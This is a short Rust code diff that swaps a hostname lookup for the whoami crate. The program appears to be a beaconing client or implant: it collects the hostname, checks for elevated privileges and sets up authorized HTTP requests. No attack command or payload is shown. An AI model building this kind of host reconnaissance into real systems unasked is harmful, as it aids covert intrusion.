@@ -1,12 +1,14 @@
 extern crate reqwest;
 extern crate tokio;
 extern crate serde_json;
+extern crate whoami;
 
 use std::{thread, time};
 use std::env::{args};
 use std::process::exit;
 use rand::prelude::*;
 
+use whoami::hostname;
 use reqwest::{Client};
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 
@@ -54,11 +56,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
     
-    let mut hn = hostname::get()
-        .ok()
-        .unwrap()
-        .into_string()
-        .unwrap();
+    let mut hn = hostname();
 
     let is_admin = cmd::getprivs::is_elevated();  
     println!("{}", is_admin);
